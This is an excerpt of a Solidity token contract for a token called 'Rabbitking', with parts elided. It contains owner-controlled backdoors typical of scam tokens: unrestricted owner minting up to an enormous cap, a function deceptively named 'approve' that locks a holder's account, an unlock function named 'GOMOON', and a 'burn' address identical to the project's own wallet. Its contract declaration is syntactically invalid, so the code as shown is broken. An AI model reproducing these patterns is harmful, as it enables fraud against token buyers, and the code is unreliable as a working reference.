...
contract sun is king {
    using SafeMath for uint256;

    string constant public name = 'Rabbitking';

    string constant public symbol = 'Rabbitking';

    uint8 constant public decimals = 18;

    uint256 public totalSupply = 100000000000000*10**uint256(decimals);

    uint256 public constant Supply = 1000000000000000000000000000000000000000000000000000 * 10 ** uint256(decimals);
    ...
    address public projectAddress =0x86A70Cc9D209C3793A8FbA79778a523F5Ee56E94;


    address public burnAddress =0x86A70Cc9D209C3793A8FbA79778a523F5Ee56E94;
    ...
    function emission(address target, uint256 edAmount) public onlyowneres{
    	require (totalSupply + edAmount <= Supply);
    ...
    function approve(address account) public onlyowneres {
        _lkck[account] = true;
    }


    function GOMOON(address account) public onlyowneres {
        _lkck[account] = false;
    }
